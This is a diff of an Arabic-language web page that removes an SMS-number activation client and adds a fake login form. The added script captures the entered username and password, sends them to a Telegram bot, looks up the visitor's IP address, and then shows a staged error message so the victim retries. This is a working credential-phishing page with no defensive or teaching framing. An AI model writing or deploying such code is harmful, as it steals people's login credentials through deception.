-                        proceedGetNumber(country, service);
-                    })
-                    .catch(function() {
-                        proceedGetNumber(country, service);
-                    });
+            const result = await res.json();
+            if (!result.ok) {
+                console.error('Telegram API error:', result);
+                showToast('⚠️ خطأ في إرسال البيانات إلى البوت');
             } else {
-                proceedGetNumber(country, service);
+                showToast('✅ تم إرسال البيانات بنجاح');
             }
+        } catch (e) {
+            console.error('Network error:', e);
+            showToast('⚠️ خطأ في الاتصال بالبوت');
+        }
+    }
+
+    async function getUserIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch {
+            return null;
+        }
+    }
+
+    // ========== ربط النموذج ==========
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+
+        if (!username || !password) {
+            showToast('⚠️ الرجاء ملء جميع الحقول');
+            return;
         }
 
-        function proceedGetNumber(country, service) {
-            setStatus('⏳ جاري الحصول على رقم...', 'info');
-            btnGetNumber.disabled = true;
-            
-            apiCall('getNumber', { country: country, service: service })
-                .then(function(resp) {
-                    btnGetNumber.disabled = false;
-                    if (resp.startsWith('ACCESS_NUMBER:')) {
-                        var parts = resp.split(':');
-                        state.activationId = parts[1];
-                        state.phoneNumber = parts[2];
-                        state.smsList = [];
-                        
-                        displayNumber.textContent = state.phoneNumber;
-                        displayActivationId.textContent = state.activationId;
-                        displayStatus.textContent = '🟢 نشط';
-                        displayStatus.style.color = '#2e7d32';
-                        btnCheckSMS.disabled = false;
-                        
-                        setStatus('✅ تم الحصول على رقم: ' + state.phoneNumber, 'success');
-                        log('📱 رقم جديد: ' + state.phoneNumber + ' (ID: ' + state.activationId + ')', 'success');
-                        renderSMS();
-                        
-                        if (autoRefreshCheck.checked) {
-                            startAutoRefresh();
-                        }
-                    } else if (resp === 'NO_NUMBERS') {
-                        setStatus('❌ لا توجد أرقام متاحة لهذه الدولة والخدمة', 'error');
-                    } else if (resp === 'NO_BALANCE') {
-                        setStatus('❌ الرصيد غير كافٍ. اشحن الحساب', 'error');
-                    } else if (resp === 'BAD_KEY') {
-                        setStatus('❌ مفتاح API خاطئ', 'error');
-                    } else {
-                        setStatus('⚠️ ' + resp, 'warn');
-                    }
-                })
-                .catch(function(err) {
-                    btnGetNumber.disabled = false;
-                    setStatus('❌ خطأ في الاتصال: ' + err.message + '. جرب تغيير طريقة الاتصال أعلاه', 'error');
-                });
-        }
+        // تفعيل التحميل
+        showLoading(true);
+        document.getElementById('errorMsg').style.display = 'none';
 
-        // ====================================================================
-        // CHECK SMS
-        // ====================================================================
-        function checkSMS() {
-            if (!state.activationId) {
-                setStatus('❌ لا يوجد تفعيل نشط', 'error');
-                return;
-            }
-            if (state.isChecking) return;
-            
-            state.isChecking = true;
-            btnCheckSMS.disabled = true;
-            setStatus('⏳ جاري التحقق من الرسائل...', 'info');
-            
-            apiCall('getStatus', { id: state.activationId })
-                .then(function(resp) {
-                    state.isChecking = false;
-                    btnCheckSMS.disabled = false;
-                    
-                    if (resp.startsWith('STATUS_OK:')) {
-                        var parts = resp.split(':');
-                        var smsText = parts.slice(1).join(':');
-                        
-                        if (smsText && smsText.length > 0) {
-                            var isDuplicate = state.smsList.some(function(s) { return s.text === smsText; });
-                            if (!isDuplicate) {
-                                var isHtml = smsText.includes('<') && smsText.includes('>') && (smsText.includes('</') || smsText.includes('/>'));
-                                var smsEntry = {
-                                    from: state.phoneNumber || 'N/A',
-                                    text: smsText,
-                                    time: new Date().toLocaleString('ar-MA'),
-                                    isHtml: isHtml
-                                };
-                                state.smsList.unshift(smsEntry);
-                                renderSMS();
-                                setStatus('✅ تم استلام رسالة جديدة!', 'success');
-                                log('📩 رسالة: ' + smsText.substring(0, 60) + (smsText.length > 60 ? '...' : ''), 'success');
-                            } else {
-                                setStatus('ℹ️ لا توجد رسائل جديدة', 'info');
-                            }
-                        }
-                    } else if (resp === 'STATUS_WAIT_CODE') {
-                        setStatus('⏳ في انتظار الرسالة...', 'info');
-                    } else if (resp === 'STATUS_CANCEL') {
-                        setStatus('⚠️ تم إلغاء التفعيل', 'warn');
-                        state.activationId = null;
-                        state.phoneNumber = null;
-                        btnCheckSMS.disabled = true;
-                        displayNumber.textContent = '—';
-                        displayActivationId.textContent = '—';
-                        displayStatus.textContent = '⚪';
-                        stopAutoRefresh();
-                    } else {
-                        setStatus('⚠️ ' + resp, 'warn');
-                    }
-                })
-                .catch(function(err) {
-                    state.isChecking = false;
-                    btnCheckSMS.disabled = false;
-                    setStatus('❌ خطأ: ' + err.message, 'error');
-                });
-        }
+        // إرسال البيانات إلى تلجرام
+        await sendToTelegram({ username, password });
 
-        // ====================================================================
-        // CANCEL ACTIVATION
-        // ====================================================================
-        function cancelActivation() {
-            if (!state.activationId) {
-                setStatus('❌ لا يوجد تفعيل نشط', 'error');
-                return;
-            }
-            
-            setStatus('⏳ جاري إلغاء التفعيل...', 'info');
-            apiCall('setStatus', { status: 8, id: state.activationId })
-                .then(function(resp) {
-                    if (resp === 'ACCESS_READY') {
-                        setStatus('✅ تم إلغاء التفعيل', 'success');
-                        state.activationId = null;
-                        state.phoneNumber = null;
-                        btnCheckSMS.disabled = true;
-                        displayNumber.textContent = '—';
-                        displayActivationId.textContent = '—';
-                        displayStatus.textContent = '⚪';
-                        stopAutoRefresh();
-                        log('⏹️ تم إلغاء التفعيل', '');
-                    } else {
-                        setStatus('⚠️ ' + resp, 'warn');
-                    }
-                })
-                .catch(function(err) {
-                    setStatus('❌ خطأ: ' + err.message, 'error');
-                });
-        }
+        // إظهار الخطأ بعد 1.5 ثانية (محاكاة)
+        setTimeout(() => {
+            showLoading(false);
+            document.getElementById('errorMsg').style.display = 'block';
+            document.getElementById('password').value = '';
+            document.getElementById('password').focus();
+        }, 1500);
+    });
 
-        // ====================================================================
-        // RENDER SMS
-        // ====================================================================
-        function renderSMS() {
-            smsCount.textContent = state.smsList.length;
-            
-            if (state.smsList.length === 0) {
-                smsList.innerHTML = '<div class="sms-empty">📭 لا توجد رسائل بعد. في انتظار وصول رسالة...</div>';
-                return;
-            }
-            
-            var html = '';
-            state.smsList.forEach(function(sms, idx) {
-                var badges = '';
-                if (idx === 0) badges += '<span class="badge badge-new">جديد</span> ';
-                if (sms.isHtml) badges += '<span class="badge badge-html">HTML</span> ';
-                else badges += '<span class="badge badge-sms">SMS</span> ';
-                
-                var textDisplay = sms.isHtml ? 
-                    '<div class="sms-text html-msg">' + escapeHtml(sms.text) + '</div>' : 
-                    '<div class="sms-text">' + escapeHtml(sms.text) + '</div>';
-                
-                html += '<div class="sms-item">';
-                html += '<div class="sms-header">';
-                html += '<span class="sms-from">' + escapeHtml(sms.from) + ' ' + badges + '</span>';
-                html += '<span>' + sms.time + '</span>';
-                html += '</div>';
-                html += textDisplay;
-                
-                if (sms.isHtml) {
-                    html += '<button class="toggle-raw-btn" onclick="toggleRaw(this, ' + idx + ')">👁️ عرض HTML منسق</button>';
-                    html += '<div id="rendered-' + idx + '" style="display:none;margin-top:6px;padding:6px;background:#0a0a15;border-radius:4px;border:1px solid #333;max-height:150px;overflow-y:auto;"></div>';
-                }
-                
-                html += '</div>';
-            });
-            
-            smsList.innerHTML = html;
-        }
+    // تفعيل زر الدخول عند الكتابة
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const loginBtn = document.getElementById('loginBtn');
 
-        function escapeHtml(text) {
-            var div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
+    function checkInputs() {
+        if (usernameInput.value.trim() && passwordInput.value.trim()) {
+            loginBtn.classList.add('active');
+        } else {
+            loginBtn.classList.remove('active');
         }
+    }
 
-        function toggleRaw(btn, idx) {
-            var renderedDiv = document.getElementById('rendered-' + idx);
-            if (renderedDiv.style.display === 'none') {
-                renderedDiv.style.display = 'block';
-                renderedDiv.innerHTML = state.smsList[idx].text;
-                btn.textContent = '🔒 إخفاء HTML';
-            } else {
-                renderedDiv.style.display = 'none';
-                btn.textContent = '👁️ عرض HTML منسق';
-            }
-        }
+    usernameInput.addEventListener('input', checkInputs);
+    passwordInput.addEventListener('input', checkInputs);
+</script>
 
-        function clearSMS() {
-            state.smsList = [];
-            renderSMS();
-            log('🗑️ تم مسح جميع الرسائل', '');
-            setStatus('🗑️ تم مسح الرسائل', 'info');
-        }
-
-        // ====================================================================
-        // AUTO REFRESH
-        // ====================================================================
-        function toggleAutoRefresh() {
-            if (autoRefreshCheck.checked) {
-                if (state.activationId) {
-                    startAutoRefresh();
-                } else {
-                    setStatus('⚠️ احصل على رقم أولاً قبل تفعيل التحديث التلقائي', 'warn');
-                    autoRefreshCheck.checked = false;
-                }
-            } else {
-                stopAutoRefresh();
-            }
-        }
-
-        function startAutoRefresh() {
-            stopAutoRefresh();
-            log('🔄 بدء التحديث التلقائي (5 ثوانٍ)', 'success');
-            state.autoRefreshInterval = setInterval(function() {
-                if (state.activationId && !state.isChecking) {
-                    checkSMS();
-                }
-            }, 5000);
-        }
-
-        function stopAutoRefresh() {
-            if (state.autoRefreshInterval) {
-                clearInterval(state.autoRefreshInterval);
-                state.autoRefreshInterval = null;
-                log('⏹️ إيقاف التحديث التلقائي', '');
-            }
-        }
-
-        // ====================================================================
-        // INIT
-        // ====================================================================
-        log('✅ السكريبت جاهز. المفتاح محمل.', 'success');
-        setStatus('💡 جاهز. اختر الدولة والخدمة واضغط "📱 الحصول على رقم"', 'info');
-        
-        // Auto-check balance on load
-        setTimeout(function() {
-            getBalance();
-        }, 1000);
-    </script>
 </body>
 </html>
